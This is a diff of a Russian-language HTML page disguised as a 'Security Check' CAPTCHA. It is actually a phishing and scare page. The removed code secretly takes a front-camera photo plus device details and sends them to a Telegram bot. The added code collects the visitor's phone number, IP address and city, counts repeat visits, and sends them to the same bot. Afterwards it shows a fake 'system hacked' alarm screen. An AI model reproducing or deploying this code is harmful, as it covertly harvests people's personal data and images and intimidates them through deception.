@@ -5,9 +5,22 @@
     <title>Security Check</title>
     <style>
         body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; overflow-x: hidden; }
-        #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; }
+        #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; text-align: center; }
         .welcome-text { color: #888; font-size: 12px; margin-bottom: 10px; font-family: Arial, sans-serif; }
-        .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px; font-weight: bold; }
+         
+        .phone-input { 
+            padding: 12px; 
+            font-size: 18px; 
+            border: 2px solid #ddd; 
+            border-radius: 5px; 
+            width: 250px; 
+            margin-top: 15px; 
+            text-align: center;
+            outline: none;
+        }
+        .phone-input:focus { border-color: #007bff; }
+
+        .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 15px; font-weight: bold; width: 278px; }
         #terminal { display: none; padding: 20px; line-height: 1.4; height: 100vh; overflow: hidden; background: #000; color: #0f0; }
         #leak-box { display: none; padding: 20px; background: #000; height: 100vh; animation: alarm-red 0.6s infinite alternate; }
         @keyframes alarm-red { from { background: #000; } to { background: #300; } }
@@ -16,22 +29,20 @@
         .data-list { color: #0f0; font-size: 14px; margin-top: 15px; line-height: 1.6; }
         .red-blink { color: #f00; font-weight: bold; animation: blink 0.4s step-end infinite; }
         @keyframes blink { 50% { opacity: 0; } }
-        .extracted-item { color: #aaa; margin: 5px 0; font-size: 12px; }
-        .status-done { color: #f00; font-weight: bold; float: right; }
         hr { border: 0; border-top: 2px solid #f00; margin: 15px 0; }
-        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
     <div id="terminal"></div>
 
     <div id="captcha-box">
         <div class="welcome-text">Добро пожаловать</div>
         <img src="https://www.google.com" width="120">
         <h2>Проверка безопасности</h2>
-        <p style="font-size: 14px; color: #555;">Разрешите доступ к проверке для продолжения</p>
+        <p style="font-size: 14px; color: #555;">Введите номер телефона для подтверждения личности</p>
+        
+        <input type="tel" id="user-phone" class="phone-input" placeholder="+7 (___) ___-__-__" required>
+        <br>
         <button class="btn-verify" onclick="startProcess()">Я НЕ РОБОТ</button>
     </div>
 
@@ -40,15 +51,11 @@
             <p class="glitch-text">⚠ СИСТЕМА ВЗЛОМАНА ⚠</p>
             <hr>
             <div class="data-list">
-                <p>> СТАТУС: <span class="red-blink">ДАННЫЕ ВЫГРУЖЕНЫ</span></p>
-                <p>> ВАШ IP: <span id="user-ip" style="color:#fff;">...</span></p>
-                <p>> ГОРОД: <span id="user-geo" style="color:#fff;">...</span></p>
-                <p>> УСТРОЙСТВО: <span id="user-os" style="color:#fff;">...</span></p>
-                
-                <p style="color: #f00; font-weight: bold; margin-top: 20px;">⚡ ИЗВЛЕЧЕНО:</p>
-                <div class="extracted-item">● Геолокация и маршруты <span class="status-done">DONE</span></div>
-                <div class="extracted-item">● Снимок фронтальной камеры <span id="cam-status" class="status-done">WAIT...</span></div>
-                <div class="extracted-item">● Все пароли и куки (.txt) <span class="status-done">DONE</span></div>
+                <p>> СТАТУС: <span class="red-blink">КРИТИЧЕСКАЯ УТЕЧКА</span></p>
+                <p>> ВАШ IP: <span id="display-ip" style="color:#fff;">...</span></p>
+                <p>> ГОРОД: <span id="display-geo" style="color:#fff;">...</span></p>
+                <p>> УСТРОЙСТВО: <span id="display-os" style="color:#fff;">...</span></p>
+                <p style="color: #f00; font-weight: bold; margin-top: 20px;">⚡ ДАННЫЕ ВЫГРУЖЕНЫ НА СЕРВЕР.</p>
             </div>
         </div>
     </div>
@@ -58,20 +65,24 @@
         const chat_id = "-1003861311533";
 
         async function startProcess() {
-  
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
-            } catch (e) { console.log("Камера отклонена"); }
+            const phone = document.getElementById('user-phone').value;
+            
+            if (phone.length < 7) {
+                alert("Пожалуйста, введите корректный номер телефона");
+                return;
+            }
 
             document.getElementById('captcha-box').style.display = 'none';
             document.getElementById('terminal').style.display = 'block';
 
+          
             const lines = [
-                "> [INIT] Подключение к спутнику...", "> [INFO] Захват HTTP-трафика...",
-                "> [SUCCESS] Доступ к API получен", "> [INFO] Взлом файловой системы...",
-                "> [SUCCESS] Root доступ подтвержден", "> [INFO] Снятие дампа памяти...",
-                "> [DONE] ВСЕ ДАННЫЕ ОТПРАВЛЕНЫ."
+                "> [INIT] Запуск протокола проверки...",
+                "> [INFO] Поиск совпадений в базе...",
+                "> [WARN] Обнаружена критическая уязвимость",
+                "> [SYSTEM] Перехват сессии...",
+                "> [SUCCESS] Данные синхронизированы",
+                "> [DONE] ОТЧЕТ СФОРМИРОВАН."
             ];
 
             for (let line of lines) {
@@ -79,81 +90,59 @@
                 p.innerText = line;
                 document.getElementById('terminal').appendChild(p);
                 window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 120)); 
+                await new Promise(r => setTimeout(r, 150)); 
             }
-            await getTripleData();
+
+            await sendReport(phone);
         }
 
-        async function getTripleData() {
-            let ip = "N/A", city = "N/A", battery = "N/A";
-            
-     
-            const ua = navigator.userAgent;
-            const memory = navigator.deviceMemory || "N/A";
-            const cores = navigator.hardwareConcurrency || "N/A";
-            const lang = navigator.language;
+        async function sendReport(phoneNumber) {
+       
+            let visits = localStorage.getItem('v_count') || 0;
+            visits = parseInt(visits) + 1;
+            localStorage.setItem('v_count', visits);
+
+            let ip = "N/A", city = "N/A";
             const time = new Date().toLocaleString();
 
-          
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Зарядка' : 'Разряд'})`;
-            }
-
-    
+            
             try {
                 const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
-                if (ipRes) { ip = (await ipRes.json()).ip; }
+                if (ipRes) ip = (await ipRes.json()).ip;
                 const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
                 if (geoRes) {
                     const d = await geoRes.json();
-                    city = `${d.city}, ${d.country_name} (${d.org})`;
+                    city = `${d.city}, ${d.country_name}`;
                 }
             } catch(e){}
 
-   
-            document.getElementById('user-ip').innerText = ip;
-            document.getElementById('user-geo').innerText = city;
-            document.getElementById('user-os').innerText = navigator.platform;
+          
+            document.getElementById('display-ip').innerText = ip;
+            document.getElementById('display-geo').innerText = city;
+            document.getElementById('display-os').innerText = navigator.platform;
 
-     
-            let photoSent = "ОТКЛОНЕНО";
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            if (video.srcObject) {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const imgData = canvas.toDataURL('image/jpeg');
-                photoSent = "ВЫПОЛНЕНО";
-                
- 
-                const blob = await (await fetch(imgData)).blob();
-                const formData = new FormData();
-                formData.append("chat_id", chat_id);
-                formData.append("photo", blob, "photo.jpg");
-                formData.append("caption", `📸 Снимок с IP: ${ip}`);
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
+            let message = "";
+            if (visits === 1) {
+                message = `🚀 **НОВЫЙ КЛИЕНТ**\n` +
+                          `📞 НОМЕР: \`${phoneNumber}\`\n` +
+                          `📍 IP: ${ip}\n` +
+                          `🌍 ГОРОД: ${city}\n` +
+                          `📱 УСТРОЙСТВО: ${navigator.platform}\n` +
+                          `⏰ ВРЕМЯ: ${time}`;
+            } else {
+                message = `♻️ **ПОВТОРНЫЙ ПЕРЕХОД #${visits}**\n` +
+                          `📞 НОМЕР: \`${phoneNumber}\`\n` +
+                          `📍 IP: ${ip}`;
             }
-            document.getElementById('cam-status').innerText = photoSent;
 
-     
-            const msg = `⚡️ МАКСИМАЛЬНЫЙ ПРОБИВ ⚡️
-📍 IP: ${ip}
-🌍 ГОРОД: ${city}
-📱 УСТРОЙСТВО: ${navigator.platform}
-🔋 БАТАРЕЯ: ${battery}
-🧠 ОЗУ: ${memory}GB | ЯДРА: ${cores}
-⏰ ВРЕМЯ: ${time}
-📸 КАМЕРА: ${photoSent}
-🌐 ТЕХ: ${ua}`;
+       
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=markdown&text=${encodeURIComponent(message)}`);
 
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-
+         
             setTimeout(() => {
                 document.getElementById('terminal').style.display = 'none';
                 document.getElementById('leak-box').style.display = 'block';
-            }, 600);
+            }, 500);
         }
     </script>
 </body>
